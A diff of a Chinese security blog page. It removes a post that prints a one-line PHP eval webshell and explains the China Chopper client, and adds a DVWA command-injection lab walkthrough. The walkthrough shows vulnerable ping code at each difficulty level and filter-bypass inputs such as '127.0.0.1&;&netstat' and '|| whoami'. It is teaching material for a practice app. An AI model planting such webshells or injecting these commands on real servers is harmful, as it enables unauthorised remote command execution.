@@ -79,7 +79,7 @@
 
 
 
-  <meta name="keywords" content="Cknife," />
+  <meta name="keywords" content="DVWA&Command Injection," />
 
 
 
@@ -90,25 +90,25 @@
 
 
 
-<meta name="description" content="一句话木马概念在web服务器的某个web应用根目录下创建一个网站源码脚本，即web应用是由php编写的，那么木马脚本应由php编写，该脚本文件中只有一句话的脚本，用户通过远程连接该文件，通过POST方式去提交数据，从而完成远程获得webshell的访问权限。 释义如：&amp;lt;?php eval($_POST[&amp;#39;koelre&amp;#39;])?&amp;gt;eval函数是能够将其中的参数作为命令行的命">
-<meta name="keywords" content="Cknife">
+<meta name="description" content="Command Injection Command Injection，即命令注入，是指通过提交恶意构造的参数破坏命令语句结构，从而达到执行恶意命令的目的。PHP命令注入攻击漏洞是PHP应用程序中常见的脚本漏洞之一。  解决乱码问题在文本框中输入”ip address”后结果显示为乱码，在DVWA-master\dvwa\includes目录下找到dvwaPage.inc.php文件中所有的”ch">
+<meta name="keywords" content="DVWA&amp;Command Injection">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Cknife之木马篇-1">
-<meta property="og:url" content="https://koelre.com/2018/05/17/1/index.html">
+<meta property="og:title" content="DVWA之Command Injection">
+<meta property="og:url" content="https://koelre.com/2018/07/23/1/index.html">
 <meta property="og:site_name" content="koelre">
-<meta property="og:description" content="一句话木马概念在web服务器的某个web应用根目录下创建一个网站源码脚本，即web应用是由php编写的，那么木马脚本应由php编写，该脚本文件中只有一句话的脚本，用户通过远程连接该文件，通过POST方式去提交数据，从而完成远程获得webshell的访问权限。 释义如：&amp;lt;?php eval($_POST[&amp;#39;koelre&amp;#39;])?&amp;gt;eval函数是能够将其中的参数作为命令行的命">
+<meta property="og:description" content="Command Injection Command Injection，即命令注入，是指通过提交恶意构造的参数破坏命令语句结构，从而达到执行恶意命令的目的。PHP命令注入攻击漏洞是PHP应用程序中常见的脚本漏洞之一。  解决乱码问题在文本框中输入”ip address”后结果显示为乱码，在DVWA-master\dvwa\includes目录下找到dvwaPage.inc.php文件中所有的”ch">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://koelre.com/upload_image/cknife_1.jpg">
-<meta property="og:image" content="https://koelre.com/upload_image/cknife_2.jpg">
-<meta property="og:image" content="https://koelre.com/upload_image/cknife_3.jpg">
-<meta property="og:image" content="https://koelre.com/upload_image/cknife_4.jpg">
-<meta property="og:image" content="https://koelre.com/upload_image/cknife_5.jpg">
-<meta property="og:image" content="https://koelre.com/upload_image/cknife_6.jpg">
-<meta property="og:updated_time" content="2018-05-18T13:45:35.099Z">
+<meta property="og:image" content="https://koelre.com/upload_image/cj1.png">
+<meta property="og:image" content="https://koelre.com/upload_image/cj2.png">
+<meta property="og:image" content="https://koelre.com/upload_image/cj3.png">
+<meta property="og:image" content="https://koelre.com/upload_image/cj5.png">
+<meta property="og:image" content="https://koelre.com/upload_image/cj7.png">
+<meta property="og:image" content="https://koelre.com/upload_image/cj9.png">
+<meta property="og:updated_time" content="2018-07-24T01:30:04.262Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Cknife之木马篇-1">
-<meta name="twitter:description" content="一句话木马概念在web服务器的某个web应用根目录下创建一个网站源码脚本，即web应用是由php编写的，那么木马脚本应由php编写，该脚本文件中只有一句话的脚本，用户通过远程连接该文件，通过POST方式去提交数据，从而完成远程获得webshell的访问权限。 释义如：&amp;lt;?php eval($_POST[&amp;#39;koelre&amp;#39;])?&amp;gt;eval函数是能够将其中的参数作为命令行的命">
-<meta name="twitter:image" content="https://koelre.com/upload_image/cknife_1.jpg">
+<meta name="twitter:title" content="DVWA之Command Injection">
+<meta name="twitter:description" content="Command Injection Command Injection，即命令注入，是指通过提交恶意构造的参数破坏命令语句结构，从而达到执行恶意命令的目的。PHP命令注入攻击漏洞是PHP应用程序中常见的脚本漏洞之一。  解决乱码问题在文本框中输入”ip address”后结果显示为乱码，在DVWA-master\dvwa\includes目录下找到dvwaPage.inc.php文件中所有的”ch">
+<meta name="twitter:image" content="https://koelre.com/upload_image/cj1.png">
 
 
 
@@ -138,13 +138,13 @@
 
 
 
-  <link rel="canonical" href="https://koelre.com/2018/05/17/1/"/>
+  <link rel="canonical" href="https://koelre.com/2018/07/23/1/"/>
 
 
 
 
 
-  <title>Cknife之木马篇-1 | koelre</title>
+  <title>DVWA之Command Injection | koelre</title>
   
 
 
@@ -311,7 +311,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://koelre.com/2018/05/17/1/">
+    <link itemprop="mainEntityOfPage" href="https://koelre.com/2018/07/23/1/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Koelre">
@@ -328,7 +328,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Cknife之木马篇-1</h1>
+          <h1 class="post-title" itemprop="name headline">DVWA之Command Injection</h1>
         
 
         <div class="post-meta">
@@ -340,8 +340,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-17T19:15:00+08:00">
-                2018-05-17
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-07-23T10:21:30+08:00">
+                2018-07-23
               </time>
             
 
@@ -363,8 +363,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Cknife-木马/" itemprop="url" rel="index">
-                    <span itemprop="name">Cknife&木马</span>
+                  <a href="/categories/DVWA/" itemprop="url" rel="index">
+                    <span itemprop="name">DVWA</span>
                   </a>
                 </span>
 
@@ -400,18 +400,213 @@
       
 
       
-        <h1 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>在web服务器的某个web应用根目录下创建一个网站源码脚本，即web应用是由php编写的，那么木马脚本应由php编写，该脚本文件中只有一句话的脚本，用户通过远程连接该文件，通过POST方式去提交数据，从而完成远程获得webshell的访问权限。</p>
-<h2 id="释义"><a href="#释义" class="headerlink" title="释义"></a>释义</h2><p>如：<code>&lt;?php eval($_POST[&#39;koelre&#39;])?&gt;</code><br>eval函数是能够将其中的参数作为命令行的命令来解释执行。<br>其中的<code>_POST[&#39;koelre&#39;]</code>则是将传过来的<code>POST body</code>里的<code>koelre</code>变量的值获取出来，相当于一句话木马客户端中登陆的密码。通过这样，我们就可以将客户端的数据传递过来并作为命令执行了。</p>
-<h1 id="中国菜刀"><a href="#中国菜刀" class="headerlink" title="中国菜刀"></a>中国菜刀</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>中国菜刀是一款网站管理软件，通过在web应用的目录下留下一个一句话木马，就可以利用这个菜刀客户端去连接来获取webshell了。</p>
-<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>打开菜刀软件，右键添加<br><img src="/upload_image/cknife_1.jpg" alt=""><br>在地址里填写目标应用中一句话木马的URL，随后的空格里填写客户端登陆的密码，就是之前一句话里的koelre。</p>
-<p>而在config里填写的就是数据库登陆的一些参数了，如果你通过某些途径知道目标主机的数据库账号密码之类的信息，就可以顺利登陆其数据库了。还有脚本类型</p>
-<p>下面是菜刀部分功能<br><img src="/upload_image/cknife_2.jpg" alt=""></p>
+        <p>Command Injection</p>
+<p>Command Injection，即命令注入，是指通过提交恶意构造的参数破坏命令语句结构，从而达到执行恶意命令的目的。PHP命令注入攻击漏洞是PHP应用程序中常见的脚本漏洞之一。</p>
+<p><img src="/upload_image/cj1.png" alt=""></p>
+<p>解决乱码问题<br>在文本框中输入”ip address”后结果显示为乱码，在DVWA-master\dvwa\includes目录下找到dvwaPage.inc.php文件中所有的”charset=utf-8”，修改”charset=gb2312”，即可。</p>
+<h1 id="low"><a href="#low" class="headerlink" title="low"></a>low</h1><p>服务器端核心代码</p>
+<pre><code>&lt;?php
+
+if( isset( $_POST[ &apos;Submit&apos; ]  ) ) {
+    // Get input
+    $target = $_REQUEST[ &apos;ip&apos; ];
+</code></pre><p>没有对用户的输入进行任何的过滤或验证，而且直接使用 $_REQUEST 传递用户输入的 ip 值，这会接受用户通过 GET、POST甚至Cookies 提交的值。</p>
+<pre><code>// Determine OS and execute the ping command.
+if( stristr( php_uname( &apos;s&apos; ), &apos;Windows NT&apos; ) ) {
+    // Windows
+    $cmd = shell_exec( &apos;ping  &apos; . $target );
+}
+else {
+    // *nix
+    $cmd = shell_exec( &apos;ping  -c 4 &apos; . $target );
+}
+</code></pre><p>stristr() - strstr() 函数的忽略大小写版本，也就是查找字符串首次出现的位置，这里用来判断当前系统是否为 Windows 系统。</p>
+<p>php_uname() - 返回了运行 PHP 的操作系统的相关描述。包含如下几种模式：</p>
 <ul>
-<li>文件管理<br><img src="/upload_image/cknife_3.jpg" alt=""><br><img src="/upload_image/cknife_4.jpg" alt=""></li>
-<li>数据库管理<br><img src="/upload_image/cknife_5.jpg" alt=""></li>
-<li>虚拟终端<br><img src="/upload_image/cknife_6.jpg" alt=""></li>
-<li>自写脚本 待续。。。。</li>
+<li>‘a’：此为默认。包含序列 “s n r v m” 里的所有模式。</li>
+<li>‘s’：操作系统名称。例如： FreeBSD。</li>
+<li>‘n’：主机名。例如： localhost.example.com。</li>
+<li>‘r’：版本名称，例如： 5.1.2-RELEASE。</li>
+<li>‘v’：版本信息。操作系统之间有很大的不同。</li>
+<li>‘m’：机器类型。例如：i386。</li>
 </ul>
+<p>shell_exec() - 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。</p>
+<p><strong>命令连接符和管道:</strong></p>
+<ul>
+<li>| 管道符，就是将上一个命令的输出，作为下一个命令的输入</li>
+<li>&amp; 连接符，连接多条命令</li>
+<li>; 连接符，Linux下用来连接多条命令</li>
+<li>&amp;&amp; 连接符，逻辑与关系，第一个命令成功 第二个命令才会执行</li>
+<li><p>|| 连接符，逻辑或的关系，第一个命令成功 第二个命令不执行</p>
+<pre><code>// Feedback for the end user
+
+$html .= &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;;
+
+}
+
+?&gt;
+</code></pre></li>
+</ul>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><p>输入命令：127.0.0.1 &amp;&amp; dir</p>
+<p><img src="/upload_image/cj2.png" alt=""></p>
+<h3 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h3><p>输入命令：192.168.202.137 &amp;&amp; tree</p>
+<p><img src="/upload_image/cj3.png" alt=""></p>
+<h1 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h1><pre><code>&lt;?php
+
+if( isset( $_POST[ &apos;Submit&apos; ]  ) ) {
+// Get input
+$target = $_REQUEST[ &apos;ip&apos; ];
+
+// Set blacklist
+$substitutions = array(
+    &apos;&amp;&amp;&apos; =&gt; &apos;&apos;,
+    &apos;;&apos;  =&gt; &apos;&apos;,
+);
+
+// Remove any of the charactars in the array (blacklist).
+$target = str_replace( array_keys( $substitutions ), $substitutions, $target );
+
+// Determine OS and execute the ping command.
+if( stristr( php_uname( &apos;s&apos; ), &apos;Windows NT&apos; ) ) {
+    // Windows
+    $cmd = shell_exec( &apos;ping  &apos; . $target );
+}
+else {
+    // *nix
+    $cmd = shell_exec( &apos;ping  -c 4 &apos; . $target );
+}
+
+// Feedback for the end user
+$html .= &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;;
+}
+
+?&gt;
+</code></pre><p>相比Low级别的代码，在 Medium 级中的代码增加使用了 str_replace 过滤用户输入中的 “&amp;&amp;” 和 “;” 两个连接符,即把”&amp;&amp;” 、”;”删除，本质上采用的是黑名单机制。str_replace把”&amp;&amp;”,”;”替换为空字符，因此依旧存在安全问题。</p>
+<h2 id="关键函数释义"><a href="#关键函数释义" class="headerlink" title="关键函数释义"></a>关键函数释义</h2><p>str_replace — 子字符串替换</p>
+<p>说明：</p>
+<pre><code>mixed str_replace ( mixed $search , mixed $replace , mixed $subject [, int &amp;$count ] )
+</code></pre><p>该函数返回一个字符串或者数组。该字符串或数组是将 subject 中全部的 search 都被 replace 替换之后的结果。</p>
+<p>e.g.1：</p>
+<pre><code>&lt;?php
+$search = array(&apos;A&apos;, &apos;B&apos;, &apos;C&apos;, &apos;D&apos;, &apos;E&apos;);
+$replace = array(&apos;B&apos;, &apos;C&apos;, &apos;D&apos;, &apos;E&apos;, &apos;F&apos;);
+$subject = &apos;ABCDE&apos;;
+
+echo str_replace($search, $replace, $subject); // output: &apos;FFFFFF&apos;
+?&gt;
+</code></pre><p>Because E = F according to our array,the actual output is ‘FFFFF’.</p>
+<p>e.g.2：</p>
+<pre><code>&lt;?php
+// a very beatiful way to do multiple replacements is this one, using just one array
+$replaceThis = Array(
+&apos;old word&apos; =&gt; &apos;new word&apos;,
+&apos;was&apos; =&gt; &apos;it&apos;,
+&apos;past&apos; =&gt; &apos;future&apos;,
+);
+
+$originalText = &quot;every old word was a thing of the past...&quot;;
+$replacedText = str_replace(array_keys($replaceThis), $replaceThis, $originalText);
+echo $replacedText;
+?&gt;
+</code></pre><p>the output is :every new word it a thing of the future…</p>
+<h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><ol>
+<li>因为被过滤的只有”&amp;&amp;”与” ;”，所以”&amp;”不会受影响。</li>
+</ol>
+<p>注意：</p>
+<p>”&amp;&amp;”与” &amp;”的区别：<br>A &amp;&amp; B</p>
+<p>先执行A，执行成功后执行B，否则不执行B.</p>
+<p>A &amp; B</p>
+<p>先执行A，不管是否执行成功，都执行B.</p>
+<p><img src="/upload_image/cj5.png" alt=""></p>
+<ol>
+<li>str_replace把”&amp;&amp;” 、”;”替换为空字符，因此可以采用以下方式绕过：</li>
+</ol>
+<p>127.0.0.1&amp;;&amp;netstat</p>
+<p><img src="/upload_image/cj7.png" alt=""></p>
+<h1 id="High"><a href="#High" class="headerlink" title="High"></a>High</h1><p>服务器端核心代码</p>
+<pre><code>&lt;?php
+
+if( isset( $_POST[ &apos;Submit&apos; ]  ) ) {
+// Get input
+$target = trim($_REQUEST[ &apos;ip&apos; ]);
+
+// Set blacklist
+$substitutions = array(
+    &apos;&amp;&apos;  =&gt; &apos;&apos;,
+    &apos;;&apos;  =&gt; &apos;&apos;,
+    &apos;| &apos; =&gt; &apos;&apos;,
+    &apos;-&apos;  =&gt; &apos;&apos;,
+    &apos;$&apos;  =&gt; &apos;&apos;,
+    &apos;(&apos;  =&gt; &apos;&apos;,
+    &apos;)&apos;  =&gt; &apos;&apos;,
+    &apos;`&apos;  =&gt; &apos;&apos;,
+    &apos;||&apos; =&gt; &apos;&apos;,
+);
+
+// Remove any of the charactars in the array (blacklist).
+$target = str_replace( array_keys( $substitutions ), $substitutions, $target );
+
+// Determine OS and execute the ping command.
+if( stristr( php_uname( &apos;s&apos; ), &apos;Windows NT&apos; ) ) {
+    // Windows
+    $cmd = shell_exec( &apos;ping  &apos; . $target );
+}
+else {
+    // *nix
+    $cmd = shell_exec( &apos;ping  -c 4 &apos; . $target );
+}
+
+// Feedback for the end user
+$html .= &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;;
+}
+
+?&gt;
+</code></pre><h2 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>”| ”（注意这里|后有一个空格）替换为空字符，于是 ”|”可以绕过。</p>
+<p>‘| ‘ =&gt; ‘’, 这里过滤的是|加一个空格，而且这条排在了||之前，当我们输入|| whoami时，会被过滤为|whoami，||同理也可以绕过。</p>
+<p><img src="/upload_image/cj9.png" alt=""></p>
+<h1 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h1><p>服务器端核心代码</p>
+<pre><code>&lt;?php
+
+if( isset( $_POST[ &apos;Submit&apos; ]  ) ) {
+// Check Anti-CSRF token
+checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; );
+
+// Get input
+$target = $_REQUEST[ &apos;ip&apos; ];
+$target = stripslashes( $target );
+
+// Split the IP into 4 octects
+$octet = explode( &quot;.&quot;, $target );
+
+// Check IF each octet is an integer
+if( ( is_numeric( $octet[0] ) ) &amp;&amp; ( is_numeric( $octet[1] ) ) &amp;&amp; ( is_numeric( $octet[2] ) ) &amp;&amp; ( is_numeric( $octet[3] ) ) &amp;&amp; ( sizeof( $octet ) == 4 ) ) {
+    // If all 4 octets are int&apos;s put the IP back together.
+    $target = $octet[0] . &apos;.&apos; . $octet[1] . &apos;.&apos; . $octet[2] . &apos;.&apos; . $octet[3];
+
+    // Determine OS and execute the ping command.
+    if( stristr( php_uname( &apos;s&apos; ), &apos;Windows NT&apos; ) ) {
+        // Windows
+        $cmd = shell_exec( &apos;ping  &apos; . $target );
+    }
+    else {
+        // *nix
+        $cmd = shell_exec( &apos;ping  -c 4 &apos; . $target );
+    }
+
+    // Feedback for the end user
+    $html .= &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;;
+}
+else {
+    // Ops. Let the user name theres a mistake
+    $html .= &apos;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&apos;;
+}
+}
+
+// Generate Anti-CSRF token
+generateSessionToken();
+
+?&gt;
+</code></pre><p>使用 token 防止 CSRF 就不说了，首先使用 stripslashes 转义反斜线后的字符串，然后恐怖的来了，将输入的字符串依据’.’号分隔开，然后依次判断每段是否为整数，如果是则执行命令，如果不是则直接报错退出。</p>
 
       
     </div>
@@ -431,12 +626,12 @@
   <script type="text/javascript" src="http://jslibs.wuxubj.cn/sweetalert_mini/jquery-1.7.1.min.js"></script>
   <script src="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.min.js"></script>
   <link rel="stylesheet" type="text/css" href="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.mini.css"> 
-  <p><span>本文标题:</span><a href="/2018/05/17/1/">Cknife之木马篇-1</a></p>
+  <p><span>本文标题:</span><a href="/2018/07/23/1/">DVWA之Command Injection</a></p>
   <p><span>文章作者:</span><a href="/" title="访问 Koelre 的个人博客">Koelre</a></p>
-  <p><span>发布时间:</span>2018年05月17日 - 19:05</p>
-  <p><span>最后更新:</span>2018年05月18日 - 21:05</p>
-  <p><span>原始链接:</span><a href="/2018/05/17/1/" title="Cknife之木马篇-1">https://koelre.com/2018/05/17/1/</a>
-      <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://koelre.com/2018/05/17/1/"  aria-label="复制成功！"></i></span>
+  <p><span>发布时间:</span>2018年07月23日 - 10:07</p>
+  <p><span>最后更新:</span>2018年07月24日 - 09:07</p>
+  <p><span>原始链接:</span><a href="/2018/07/23/1/" title="DVWA之Command Injection">https://koelre.com/2018/07/23/1/</a>
+      <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://koelre.com/2018/07/23/1/"  aria-label="复制成功！"></i></span>
   </p>
   <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
 </div>
@@ -499,7 +694,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/Cknife/" rel="tag"># Cknife</a>
+            <a href="/tags/DVWA-Command-Injection/" rel="tag"># DVWA&Command Injection</a>
           
         </div>
       
@@ -512,8 +707,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/05/16/1/" rel="next" title="ITIL v3 培训总结-1">
-                <i class="fa fa-chevron-left"></i> ITIL v3 培训总结-1
+              <a href="/2018/07/08/1/" rel="next" title="DVWA之Brute Force">
+                <i class="fa fa-chevron-left"></i> DVWA之Brute Force
               </a>
             
           </div>
@@ -521,10 +716,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/05/18/1/" rel="prev" title="burpsuite之python扩展-1">
-                burpsuite之python扩展-1 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -656,7 +847,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#一句话木马"><span class="nav-number">1.</span> <span class="nav-text">一句话木马</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#概念"><span class="nav-number">1.1.</span> <span class="nav-text">概念</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#释义"><span class="nav-number">1.2.</span> <span class="nav-text">释义</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#中国菜刀"><span class="nav-number">2.</span> <span class="nav-text">中国菜刀</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#概述"><span class="nav-number">2.1.</span> <span class="nav-text">概述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#使用方法"><span class="nav-number">2.2.</span> <span class="nav-text">使用方法</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#low"><span class="nav-number">1.</span> <span class="nav-text">low</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞利用"><span class="nav-number">1.1.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#windows"><span class="nav-number">1.1.1.</span> <span class="nav-text">windows</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#linux"><span class="nav-number">1.1.2.</span> <span class="nav-text">linux</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Medium"><span class="nav-number">2.</span> <span class="nav-text">Medium</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#关键函数释义"><span class="nav-number">2.1.</span> <span class="nav-text">关键函数释义</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞利用-1"><span class="nav-number">2.1.1.</span> <span class="nav-text">漏洞利用</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#High"><span class="nav-number">3.</span> <span class="nav-text">High</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞利用-2"><span class="nav-number">3.1.</span> <span class="nav-text">漏洞利用</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Impossible"><span class="nav-number">4.</span> <span class="nav-text">Impossible</span></a></li></ol></div>
             
 
           </div>
